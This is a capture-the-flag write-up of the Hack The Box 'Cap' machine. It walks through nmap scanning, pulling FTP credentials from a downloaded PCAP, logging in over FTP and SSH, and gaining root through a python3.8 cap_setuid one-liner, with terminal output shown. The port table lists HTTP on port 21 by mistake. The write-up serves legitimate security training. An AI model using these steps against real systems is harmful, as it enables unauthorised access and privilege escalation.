## Default Information
IP address : 10.10.10.245\
Operating System : Linux

## Enumeration
Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports
```code 
sudo nmap -sC -sV -A -p- -T4 10.10.10.245 -vv
```
From the output of ```NMAP```, we are able to obtain the following information about the open ports:
| Port Number | Service | Version |
|-----|------------------|----------------------|
| 21	| FTP | vsftpd 3.0.3 |
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
| 21	| HTTP | Gunicorn |

## Discovery
Visiting the webpage at ```10.10.10.245```, the site appears to be a security dashboard
![Screenshot of 10.10.10.245](https://github.com/joelczk/writeups/blob/main/HTB/Images/cap_securitydashboard.PNG)
The ```IP config``` and ```Network Status``` does not contain any fascinating information, but the ```security snapshot``` contains a PCAP file that can be downloaded. 
![Screenshot of security snapshot](https://github.com/joelczk/writeups/blob/main/HTB/Images/cap_securitysnapshot.PNG)
We will then proceed to save the PCAP file downloaded from ```http://10.10.10.245/data/0``` , ```http://10.10.10.245/data/1```, ```http://10.10.10.245/data/2``` and ```http://10.10.10.245/data/3```\
Viewing the PCAP file from ```http://10.10.10.245/data/0```, we are able to discover that there is a connection to the FTP server, and we are also able to retrieve the username and password to the FTP server
![Screenshot of FTP server](https://github.com/joelczk/writeups/blob/main/HTB/Images/cap_FTP.PNG)

## Exploitation
Now, we will login to the FTP server using the discovered username and password. Afterwards, we will download the ```user.txt``` file to our server.
```code                                                                           
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.245                                                     1 ⚙
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27 09:16 .
drwxr-xr-x    3 0        0            4096 May 23 19:17 ..
lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23 19:17 .cache
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -> /dev/null
-r--------    1 1001     1001           33 Aug 08 10:24 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (298.3941 kB/s)
ftp>
```
We will find the key from the ```user.txt``` file using the ```cat``` command, to obtain our user key.\
Remembering that we have an SSH serve, we will now try to login to the SSH server. In the SSH server, we notice that the user ```nathan``` is unable to run sudo commands. Hence,we will start by searching for sudo permissions or SUID binaries that could escalate privileges and help us obtain the root shell.
```code
──(kali㉿kali)-[~]
└─$ ssh nathan@10.10.10.245                                              2 ⚙
nathan@10.10.10.245's password: 
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
nathan@cap:~$ 
```
We notice that ```python 3.8``` has a ```setuid``` command that can help us escalate to UID 0(root) and obtain a root shell. From there, we will be able to obtain our system flag.
```code
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# cd /root
root@cap:/root# cat root.txt
```
